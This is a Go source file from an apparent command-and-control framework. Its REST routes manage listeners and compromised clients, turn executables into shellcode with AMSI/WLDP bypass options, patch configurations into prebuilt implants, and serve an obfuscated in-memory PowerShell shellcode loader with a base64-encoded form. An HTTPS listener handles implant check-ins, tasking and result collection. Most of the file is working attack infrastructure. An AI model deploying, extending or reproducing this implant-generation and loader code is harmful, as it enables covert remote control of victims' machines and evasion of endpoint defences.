package routes

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/akamensky/argparse"
	"github.com/gin-gonic/gin"
	"github.com/latortuga71/GoC2/internal/data"
	"github.com/latortuga71/GoC2/internal/db"
	"github.com/latortuga71/GoC2/internal/log"
	"github.com/latortuga71/GoC2/internal/server"
	"github.com/latortuga71/GoC2/pkg/generators/donut"
	"github.com/latortuga71/GoC2/pkg/generators/srdi"
	"github.com/mattn/go-shellwords"
	"golang.org/x/text/encoding/unicode"
)

func LogRequest(c *gin.Context) {
	ipStr := c.RemoteIP()
	method := c.Request.Method
	path := c.FullPath()
	log.Log.Info().Str("service", "RestAPI").Msgf("%s %s Request From %s", method, path, ipStr)
}

func ClientResults(c *gin.Context) {
	LogRequest(c)
	id := c.Param("id")
	for key, client := range db.ClientsDatabase.Database {
		if key == id {
			c.JSON(http.StatusOK, client.Results)
			return
		}
	}
	c.JSON(http.StatusNotFound, gin.H{"message": "Client not Found."})
}

func ClientTasks(c *gin.Context) {
	LogRequest(c)
	id := c.Param("id")
	for key, client := range db.ClientsDatabase.Database {
		if key == id {
			c.JSON(http.StatusOK, client.Tasks)
			return
		}
	}
	c.JSON(http.StatusNotFound, gin.H{"message": "Client not Found."})
}

func ClientEndpoint(c *gin.Context) {
	LogRequest(c)
	id := c.Param("id")
	for key, client := range db.ClientsDatabase.Database {
		if key == id {
			c.JSON(http.StatusOK, client)
			return
		}
	}
	c.JSON(http.StatusNotFound, gin.H{"message": "Client not Found."})
}

func ClientsEndpoint(c *gin.Context) {
	LogRequest(c)
	better := make(map[string]data.Client)
	// hack to remove tasks and results.
	for _, x := range db.ClientsDatabase.Database {
		x.Tasks = nil
		x.Results = nil
		//x.RsaPrivateKey = nil
		x.RsaPublicKey = nil
		better[x.ClientId] = x
	}
	c.JSON(200, better)
}

func HealthEndpoint(c *gin.Context) {
	LogRequest(c)
	c.JSON(200, gin.H{
		"Status": "OK",
	})
}

func OperatorsEndpoint(c *gin.Context) {
	LogRequest(c)
	c.JSON(200, db.OperatorsDatabase.Database)
}

func verifyListener(l *data.Listener) error {
	if l.Listener > 1 {
		return errors.New("Invalid Listener Type")
	}
	return nil
}

func DeleteListenerEndpoint(c *gin.Context) {
	LogRequest(c)
	port := c.Param("port")
	// code to delete a listener
	if !db.ListenerDatabase.DeleteListener(port) {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Listener could not be deleted"})
		return
	}
	c.JSON(http.StatusCreated, gin.H{"Status": "Deleted Listener"})
	server.ServerBroadCastMessage(fmt.Sprintf("Deleted Listener On Port %s", port))
}

func CreateListenerEndpoint(c *gin.Context) {
	LogRequest(c)
	listenerPayload := &data.Listener{}
	err := c.BindJSON(listenerPayload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
		return
	}
	err = verifyListener(listenerPayload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Listener type invalid"})
		return
	}
	// code to startup a new listener.
	if !db.ListenerDatabase.AddListener(listenerPayload.Label, listenerPayload.Port, listenerPayload.Listener) {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Listener already active."})
		return
	}
	// pass channel so we can listen on it. for shutdown
	if listenerPayload.Listener == data.WebsocketListener {
		go StartWebSocketListener(listenerPayload.Port, db.ListenerDatabase.Database[listenerPayload.Port].ShutdownChannel)
		c.JSON(http.StatusCreated, gin.H{"Status": "Created WebSocketListener"})
		return
	}
	if listenerPayload.Listener == data.HTTPSListener {
		go StartHttpsListener(listenerPayload.Port, db.ListenerDatabase.Database[listenerPayload.Port].ShutdownChannel)
		c.JSON(http.StatusCreated, gin.H{"Status": "TODO Created HTTPS Listener"})
		return
	}

}

func GetListenerEndpoint(c *gin.Context) {
	LogRequest(c)
	c.JSON(200, db.ListenerDatabase.Database)
}

func ParseDonutArgs(donutArgs string) (*donut.DonutConfig, error) {

	parser := argparse.NewParser("go-donut", "Convert a VBS/JS or PE/.NET EXE/DLL to shellcode.\n\t\t"+
		"Only the finest artisanal donuts are made of shells.")

	// -MODULE OPTIONS-
	moduleName := parser.String("n", "module", &argparse.Options{Required: false,
		Help: "Module name. Randomly generated by default with entropy enabled."})
	url := parser.String("u", "url", &argparse.Options{Required: false,
		Help: "HTTP server that will host the donut module."})
	entropy := parser.Int("e", "entropy", &argparse.Options{Required: false, Default: 3,
		Help: "Entropy. 1=disable, 2=use random names, 3=random names + symmetric encryption (default)"})

	//  -PIC/SHELLCODE OPTIONS-
	archStr := parser.String("a", "arch", &argparse.Options{Required: false,
		Default: "x84", Help: "Target Architecture: x32, x64, or x84"})
	bypass := parser.Int("b", "bypass", &argparse.Options{Required: false,
		Default: 3, Help: "Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail."})
	format := parser.Int("f", "format", &argparse.Options{Required: false,
		Default: 1, Help: "Output format. 1=raw, 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex"})
	oepString := parser.String("y", "oep", &argparse.Options{Required: false,
		Help: "Create a new thread for loader. Optionally execute original entrypoint of host process."})
	action := parser.Int("x", "exit", &argparse.Options{Required: false,
		Default: 1, Help: "Exiting. 1=exit thread, 2=exit process"})

	//  -FILE OPTIONS-
	className := parser.String("c", "class", &argparse.Options{Required: false,
		Help: "Optional class name.  (required for .NET DLL)"})
	appDomain := parser.String("d", "domain", &argparse.Options{Required: false,
		Help: "AppDomain name to create for .NET.  Randomly generated by default with entropy enabled."})
	method := parser.String("m", "method", &argparse.Options{Required: false,
		Help: "Optional method or API name for DLL. (a method is required for .NET DLL)"})
	params := parser.String("p", "params", &argparse.Options{Required: false,
		Help: "Optional parameters/command line inside quotations for DLL method/function or EXE."})
	/*wFlag := parser.Flag("w", "unicode", &argparse.Options{Required: false,
	Help: "Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)"})
	*/
	runtime := parser.String("r", "runtime", &argparse.Options{Required: false,
		Help: "CLR runtime version. This will override the auto-detected version."})
	tFlag := parser.Flag("t", "thread", &argparse.Options{Required: false,
		Help: "Create new thread for entrypoint of unmanaged EXE."})
	zFlag := parser.Int("z", "compress", &argparse.Options{Required: false, Default: 1,
		Help: "Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman"})
	// go-donut only flags

	verbose := parser.Flag("v", "verbose", &argparse.Options{Required: false, Help: "Show verbose output."})
	d, err1 := shellwords.Parse(donutArgs)
	if len(d) == 0 {
		return nil, errors.New("No Args Provided")
	}
	if len(d) == 0 {
		return nil, errors.New("No Args Provided")
	}
	if err1 != nil {
		return nil, err1
	}
	if err := parser.Parse(d); err != nil {
		return nil, err
	}
	var err error
	oep := uint64(0)
	if *oepString != "" {
		oep, err = strconv.ParseUint(*oepString, 16, 64)
		if err != nil {
			return nil, err
		}
	}
	var donutArch donut.DonutArch
	switch strings.ToLower(*archStr) {
	case "x32", "386":
		donutArch = donut.X32
	case "x64", "amd64":
		donutArch = donut.X64
	case "x84":
		donutArch = donut.X84
	default:
		return nil, errors.New("Unknown Architecture Provided")
	}
	config := new(donut.DonutConfig)
	config.Arch = donutArch
	config.Entropy = uint32(*entropy)
	config.OEP = oep
	if *tFlag {
		config.Thread = 1
	}
	if *url == "" {
		config.InstType = donut.DONUT_INSTANCE_PIC
	} else {
		config.InstType = donut.DONUT_INSTANCE_URL
	}

	config.Parameters = *params
	config.Runtime = *runtime
	config.URL = *url
	config.Class = *className
	config.Method = *method
	config.Domain = *appDomain
	config.Bypass = *bypass
	config.ModuleName = *moduleName
	config.Compress = uint32(*zFlag)
	config.Format = uint32(*format)
	config.Verbose = *verbose
	config.ExitOpt = uint32(*action)
	return config, nil
}

func DonutEndpoint(c *gin.Context) {
	LogRequest(c)
	donutPayload := &data.DonutPayload{}
	err := c.BindJSON(donutPayload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
		return
	}
	if !validateDonut(donutPayload) {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "DONUT FAILURE INVALID PARAMETERS"})
		return
	}
	fix := "go-donut " + donutPayload.DonutString
	donutPayload.DonutString = fix
	fmt.Println(donutPayload.DonutString)
	config, err := ParseDonutArgs(donutPayload.DonutString)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": fmt.Sprintf("DONUT FAILURE %s", err)})
		return
	}
	f, err := ioutil.TempFile("", fmt.Sprintf("*raw_donut_bytes.%s", donutPayload.FileType))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": fmt.Sprintf("DONUT FAILURE %s", err)})
		return
	}
	f.Write(donutPayload.RawPEBytes)
	fileName := f.Name()
	f.Close()
	fmt.Printf("%+v", config)
	shellcode, err := donut.ShellcodeFromFile(fileName, config)
	if shellcode == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": fmt.Sprintf("DONUT FAILURE %s", err)})
		return
	}
	response := data.DonutPayload{
		ConvertedPE: shellcode.Bytes(),
	}
	os.Remove(fileName)
	c.JSON(http.StatusOK, response)
}

func validateSRDI(payload *data.SRDIPayload) bool {
	if payload.DllFunctionName == "" {
		return false
	}
	if payload.RawDllBytes == nil {
		return false
	}
	return true
}

func validateDonut(payload *data.DonutPayload) bool {
	if payload.RawPEBytes == nil {
		return false
	}
	if payload.DonutString == "" {
		return false
	}
	return true
}

/// shellcode loaderss
var msbuildString string = `<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="Tortuga">
  <Turtle />
</Target>
<UsingTask
  TaskName="Turtle"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
	<Code Type="Class" Language="cs">
	<![CDATA[
  using System;
  using System.Runtime.InteropServices;
  using Microsoft.Build.Framework;
  using Microsoft.Build.Utilities;
  public class Turtle :  Task, ITask
  {  
	public override bool Execute()
	{
	  Console.WriteLine("TEST");
	  return true;
	 }
  }]]>
	</Code>
  </Task>
</UsingTask>`

var pwshLoader string = `function potatoes {
	Param ($DLL, $METHOD)
	$tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$turnips=@()
	$tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
	return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($DLL)), $METHOD))
	}
	
	function apples {
	Param (
	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
	[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
	}
	
	$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 8000000, 0x3000, 0x40)
	
	# read from disk
	#[Byte[]] $buf = [System.IO.File]::ReadAllBytes("C:\\tmp\donut\client_latest.bin")
	# base64 option
	#[Byte[]] $buf = [System.Convert]::FromBase64String("")
	# provide hex bytes
	
	[Byte[]] $buf = REPLACE
	
	[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
	
	$parsnips = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
	
	# wait on it.
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)`

func NewEncodedPSScript(script string) (string, error) {
	uni := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
	encoded, err := uni.NewEncoder().String(script)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString([]byte(encoded)), nil
}
func ConvertPwsh(raw []byte) (string, string) {
	var csharp string
	rawHex := hex.EncodeToString(raw)
	//var classic string
	//b64Raw := base64.RawStdEncoding.EncodeToString(raw)
	//log.Printf("Raw b64 %s\n", b64Raw)
	//fmt.Printf("--- Raw Shellcode --- \n")
	// standard c++ format
	/*rawHex := hex.EncodeToString(raw)
	for x := 0; x < len(rawHex)/2; x++ {
		classic += fmt.Sprintf("\\x%x", raw[x:x+1])
	}*/
	//fmt.Println(classic)
	//fmt.Printf("--- C# Format ---\n")
	for x := 0; x < len(rawHex)/2; x++ {
		csharp += fmt.Sprintf("0x%x, ", raw[x:x+1])
	}
	csharp = csharp[0 : len(csharp)-2]
	newLoader := strings.Replace(pwshLoader, "REPLACE", csharp, -1)
	loaderB64, err := NewEncodedPSScript(newLoader)
	if err != nil {
		return newLoader, ""
	}
	return newLoader, loaderB64
}

/////

func compareChunk(data1, sig []byte) bool {
	if len(data1) != len(sig) {
		fmt.Printf("Not equal lengths")
		return false
	}
	for x := 0; x < len(sig); x++ {
		if data1[x] != sig[x] {
			return false
		}
	}
	return true
}

func findSignature(data, sig []byte) (offset int) {
	for x := 0; x < len(data); x++ {
		if data[x] == sig[0] && data[x+1] == sig[1] {
			if !compareChunk(data[x:x+len(sig)], sig) {
				//log.Println(string(data[x : x+len(sig)]))
				continue
			} else {
				return x
			}
		}
	}
	return 0
}

func replaceSignature(data []byte, replacement []byte, offset int) error {
	var x int
	//log.Println(string(data[offset : offset+PatchLength]))
	if len(replacement) > PatchLength {
		return fmt.Errorf("MAX 30 BYTES")
	}
	for x = 0; x < len(replacement); x++ {
		data[offset+x] = replacement[x]
	}
	for ; x < PatchLength; x++ {
		data[offset+x] = 0x00
	}
	//log.Println(string(data[offset : offset+PatchLength]))
	return nil
}

var Signature string = "TURTLEMALLEABLE"

const PatchLength = 500

func MultiplyString(s string, count int) string {
	var out string
	for x := 0; x < count; x++ {
		out += s
	}
	return out
}

///

func HandleImplantComm(communicationType data.ImplantComm, extention string) ([]byte, error) {
	var b []byte
	var err error
	switch communicationType {
	case data.WsCommunication:
		b, err = ioutil.ReadFile(fmt.Sprintf("wsclient%s", extention))
		if err != nil {
			return nil, err
		}
		break
	case data.HttpCommunication:
		b, err = ioutil.ReadFile(fmt.Sprintf("httpclient%s", extention))
		if err != nil {
			return nil, err
		}
		break
	default:
		return nil, fmt.Errorf("Invalid Implant Communication Passed")
	}
	return b, nil
}

func GenerateImplant(params *data.MalleableClient) ([]byte, error) {
	var b []byte
	var err error
	switch params.Type {
	case data.DllImplant:
		b, err = HandleImplantComm(params.Communication, ".dll")
		break
	case data.ExeImplant:
		b, err = HandleImplantComm(params.Communication, ".exe")
		break
	default:
		return nil, fmt.Errorf("Invalid Implant Type Passed")
	}
	if err != nil {
		return nil, err
	}
	// new config
	stringConf, err := json.Marshal(params)
	if err != nil {
		return nil, err
	}
	// find offset
	configOffset := findSignature(b, []byte(Signature))
	if configOffset == 0 {
		return nil, fmt.Errorf("Failed to find signature %s", Signature)
	}
	err = replaceSignature(b, stringConf, configOffset)
	if err != nil {
		return nil, err
	}
	return b, nil
}

func ImplantGeneratorEndpoint(c *gin.Context) {
	LogRequest(c)
	malleable := &data.MalleableClient{}
	err := c.BindJSON(malleable)
	if err != nil {
		fmt.Println(err)
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
		return
	}
	// validate payload here?
	implant, err := GenerateImplant(malleable)
	if err != nil {
		errmsg := fmt.Sprintf("Error %v", err)
		fmt.Println(err)
		c.JSON(http.StatusInternalServerError, gin.H{"Error": errmsg})
		return
	}
	malleable.GeneratedImplant = implant
	c.JSON(http.StatusOK, malleable)
	return

}
func LoaderEndpoint(c *gin.Context) {
	LogRequest(c)
	loaderPayload := &data.LoaderPayload{}
	err := c.BindJSON(loaderPayload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
		return
	}
	if len(loaderPayload.RawShellcodeBytes) > 1000000 {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Payload Exceeds 1MB limit."})
		return
	}
	loader, b64Loader := ConvertPwsh(loaderPayload.RawShellcodeBytes)
	responsePayload := data.LoaderPayload{}
	responsePayload.LoaderString = loader
	responsePayload.LoaderStringB64 = b64Loader
	c.JSON(http.StatusOK, responsePayload)
	return
}

///
func SRDIEndpoint(c *gin.Context) {
	LogRequest(c)
	//body, _ := ioutil.ReadAll(c.Request.Body)
	//println(string(body))
	//return
	srdiPayload := &data.SRDIPayload{}
	err := c.BindJSON(srdiPayload)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
		return
	}
	if !validateSRDI(srdiPayload) {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "SRDI FAILURE INVALID PARAMETERS"})
		return
	}
	shellcode := srdi.SRDIFromByteArray(srdiPayload.RawDllBytes, srdiPayload.DllFunctionName)
	if shellcode == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Error": "SRDI FAILURE"})
		return
	}
	response := data.SRDIPayload{
		ConvertedDll: shellcode,
	}
	c.JSON(http.StatusOK, response)
	return
}

func StartRestAPI(port string) {
	if !DebugMode {
		gin.SetMode(gin.ReleaseMode)
	}
	router := gin.Default()
	about := router.Group("/about")
	{
		about.POST("/contact", DistributeClientCertificate)
	}
	v1 := router.Group("/v1")
	{
		v1.DELETE("/listener/:port", DeleteListenerEndpoint)
		v1.GET("/listeners", GetListenerEndpoint)
		v1.POST("/listeners", CreateListenerEndpoint)
		v1.GET("/health", HealthEndpoint)
		v1.GET("/clients", ClientsEndpoint)
		v1.GET("/client/:id", ClientEndpoint)
		v1.GET("/client/:id/tasks", ClientTasks)
		v1.GET("/client/:id/results", ClientResults)
		v1.GET("/operators", OperatorsEndpoint)
		v1.POST("/donut", DonutEndpoint)
		v1.POST("/srdi", SRDIEndpoint)
		v1.POST("/loaders", LoaderEndpoint)
		v1.POST("/generator", ImplantGeneratorEndpoint)
	}
	err := router.RunTLS(fmt.Sprintf("0.0.0.0:%s", port), "../certs/server.cert", "../certs/server.key")
	log.Log.Fatal().Str("service", "RestAPI").Msgf("%v", err)
}

///// HTTP LISTENERS ///////////////

func LogHTTPSListenerRequest(c *gin.Context) {
	ipStr := c.RemoteIP()
	method := c.Request.Method
	path := c.FullPath()
	log.Log.Info().Str("service", "HTTPSListener").Msgf("%s %s Request From %s", method, path, ipStr)
}

func ListenerHandleCheckIn(c *gin.Context) {
	clientUUID := data.GenerateUUID()
	msgPayload := &data.Message{}
	authHeader := c.GetHeader("authorization")
	if authHeader != server.ServerSharedSecret {
		log.Log.Info().Msgf("Invalid secret provided for https checkin %s", authHeader)
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	err := c.BindJSON(msgPayload)
	if err != nil {
		log.Log.Info().Msg("Invalid client payload provided for https checkin")
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	msg := server.ServerHandleCheckInHTTPS(clientUUID, msgPayload.ToBytes())
	if msg == nil {
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed Check Debug Log"})
		return
	}
	c.JSON(http.StatusOK, msg)
	return
}

func ListenerHandleResults(c *gin.Context) {
	resultsArray := make([]data.Message, 0)
	authHeader := c.GetHeader("authorization")
	fmt.Println(authHeader)
	if authHeader != server.ServerSharedSecret {
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	idHeader := c.GetHeader("id")
	fmt.Println(idHeader)
	if idHeader == "" {
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	err := c.BindJSON(&resultsArray)
	if err != nil {
		fmt.Println(err)
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	for r := 0; r < len(resultsArray); r++ {
		server.ServerHandleTaskResult(idHeader, resultsArray[r].ToBytes())
	}
	c.JSON(http.StatusOK, gin.H{"Status": "OK"})
	return
}

func ListenerHandleGetTasks(c *gin.Context) {
	authHeader := c.GetHeader("authorization")
	fmt.Println(authHeader)
	if authHeader != server.ServerSharedSecret {
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	idHeader := c.GetHeader("id")
	if idHeader == "" {
		c.JSON(http.StatusForbidden, gin.H{"Status": "Not Allowed"})
		return
	}
	if _, ok := db.ClientsDatabase.Database[idHeader]; !ok {
		c.JSON(http.StatusNotFound, gin.H{"Status": "Not Found"})
		return
	}
	if db.ClientsDatabase.UpdateClientLastSeen(idHeader) {
		db.ClientsDatabase.UpdateClientOnline(idHeader, true)
		log.Log.Debug().Msgf("Updated Client %s Last Seen Time.", idHeader)
	}
	//c.JSON(http.StatusOK, db.ClientsDatabase.ClientGetAvailableTasks(idHeader))
	tasks := db.ClientsDatabase.ClientGetAvailableTasks(idHeader)
	t, err := json.Marshal(tasks)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"Status": "Error"})
		return
	}
	encryptedTasks := server.EncryptTaskWithSymKey(t, []byte("71"))
	c.JSON(http.StatusOK, gin.H{"data": encryptedTasks})
}

func StartHttpsListener(port string, shutdownChannel chan int) {
	if !DebugMode {
		gin.SetMode(gin.ReleaseMode)
	}
	router := gin.Default()
	router.GET("/tasks", ListenerHandleGetTasks)
	router.POST("/results", ListenerHandleResults)
	router.POST("/login", ListenerHandleCheckIn)
	httpServer := http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: router,
		//ReadTimeout:  5 * time.Second,
		//WriteTimeout: 10 * time.Second,
		//IdleTimeout:  120 * time.Second,
	}
	ctxShutDown, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer func() {
		cancel()
	}()
	go httpServer.ListenAndServeTLS("../certs/server.cert", "../certs/server.key")
	msg := fmt.Sprintf("Started HTTPS listener on %s ", port)
	msgDown := fmt.Sprintf("Shutting down HTTPS listener on %s ", port)
	log.Log.Info().Msg(msg)
	server.ServerBroadCastMessage(msg)
	<-shutdownChannel
	log.Log.Info().Msg(msgDown)
	httpServer.Shutdown(ctxShutDown)
	shutdownChannel <- 1
}
